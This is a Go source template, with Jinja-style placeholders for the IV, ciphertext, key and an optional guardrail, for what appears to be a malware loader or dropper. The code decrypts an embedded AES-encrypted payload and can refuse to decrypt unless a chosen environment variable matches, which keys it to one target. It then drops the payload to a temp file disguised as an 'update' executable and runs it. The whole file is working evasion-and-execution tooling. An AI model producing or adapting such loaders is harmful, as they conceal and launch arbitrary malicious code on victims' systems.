package main

import (
	"crypto/aes"
	"crypto/cipher"
    "crypto/sha256"
	"encoding/base64"
	"io/ioutil"
	"os"
	"os/exec"
    "runtime"
    "strings"
)

func main() {
    var key []byte
	iv, _ := base64.StdEncoding.DecodeString("{{ iv }}")
	ciphertext, _ := base64.StdEncoding.DecodeString("{{ ciphertext }}")

    {% if guardrail %}
    gStr := "{{ guardrail }}"
    parts := strings.Split(gStr, "=")
    if len(parts) == 2 {
        val := os.Getenv(parts[0])
        if val != parts[1] {
            return
        }
        hash := sha256.Sum256([]byte(gStr))
        key = hash[:]
    } else {
        return
    }
    {% else %}
	key, _ = base64.StdEncoding.DecodeString("{{ key }}")
    {% endif %}

	block, err := aes.NewCipher(key)
	if err != nil {
		return
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(ciphertext, ciphertext)

	// Remove padding (PKCS7)
	padding := int(ciphertext[len(ciphertext)-1])
    if padding > len(ciphertext) { return }
	payload := ciphertext[:len(ciphertext)-padding]

    // Drop to temp file and execute
    tmpFile, err := ioutil.TempFile("", "update.*" + exeExt())
    if err != nil {
        return
    }
    defer os.Remove(tmpFile.Name())

    if _, err := tmpFile.Write(payload); err != nil {
        return
    }
    if err := tmpFile.Chmod(0700); err != nil {
        return
    }
    tmpFile.Close()

    cmd := exec.Command(tmpFile.Name())
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    cmd.Run()
}

func exeExt() string {
    if runtime.GOOS == "windows" {
        return ".exe"
    }
    return ""
}
